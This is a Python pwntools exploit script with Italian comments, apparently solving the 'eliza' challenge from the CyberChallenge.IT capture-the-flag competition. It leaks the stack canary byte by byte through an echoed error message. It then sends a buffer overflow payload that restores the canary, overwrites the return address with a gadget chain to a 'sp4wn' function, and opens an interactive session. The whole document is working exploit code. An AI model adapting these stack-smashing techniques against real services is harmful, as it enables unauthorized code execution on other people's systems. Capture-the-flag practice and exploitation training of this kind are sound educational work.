from pwn import *

HOST = 'eliza.challs.cyberchallenge.it'
PORT = 9131

ret_gadget = 0x4006ee
sp4wn      = 0x400897

p = remote(HOST, PORT)
p.recvuntil(b'Ask me anything...\n')

# I byte precedenti rimangono in memoria tra un read() e l'altro!
# Strategia: scrivi fino al byte N del canary, leggi il leak
# Poi scrivi fino al byte N+1, ecc.

canary = b'\x00'  # byte 0 sempre \x00

for i in range(1, 8):
    # Scrivi 80 + i byte: sovrascrive i primi i byte del canary con A
    # I byte canary[i+1:] sono ancora in memoria dal giro precedente
    # Quindi printf leggerà: 80 A + i A + canary[i] (se non \x00)
    payload = b'A' * (80 + i)
    p.send(payload + b'\n')
    
    resp = p.recvuntil(b'Ask me anything...\n', timeout=5)
    leaked = resp.split(b'Sorry, "')[1].split(b'" is too long')[0]
    extra = leaked[80 + i:]
    
    if extra:
        canary += extra[:1]
        print(f'[+] Canary byte {i}: {extra[0]:02x}')
    else:
        canary += b'\x00'
        print(f'[+] Canary byte {i}: 00 (null)')

canary = canary.ljust(8, b'\x00')
print(f'[+] Canary completo: {canary.hex()}')
canary_val = u64(canary)

# Exploit
p.recvuntil(b'Ask me anything...\n')

payload  = b'A' * 80
payload += p64(canary_val)
payload += b'B' * 8
payload += p64(ret_gadget)
payload += p64(sp4wn)

p.send(payload + b'\n')
p.recvuntil(b'Ask me anything...\n')
p.send(b'\n')

p.interactive()
